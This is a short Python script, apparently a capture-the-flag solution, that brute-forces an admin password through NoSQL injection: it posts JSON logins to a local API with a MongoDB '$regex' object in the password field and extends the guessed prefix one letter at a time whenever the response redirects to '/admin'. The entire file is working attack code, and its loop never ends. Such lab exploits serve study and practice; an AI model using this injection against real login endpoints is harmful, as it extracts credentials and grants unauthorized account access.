import requests, string, json

TARGET = "http://127.0.0.1:1337/api/login"

def main():
    # Since we already know the password starts with CTF
    password = "CTF"

    while True:
        # The challenge description says the password is only upper and lower case letters.
        for c in string.ascii_letters:
            payload = {
                "username" : "admin",
                "password" : {
                    "$regex" : "^{}".format(password + c)
                }
            }

            r = requests.post(
                TARGET,
                json = payload
            )
            result = json.loads(r.text)
            if result.get("url", "") == "/admin":
                print("FOUND CHAR:", c)
                password = password + c
                print("PASSWORD:", password)

if __name__ == "__main__":
    main()
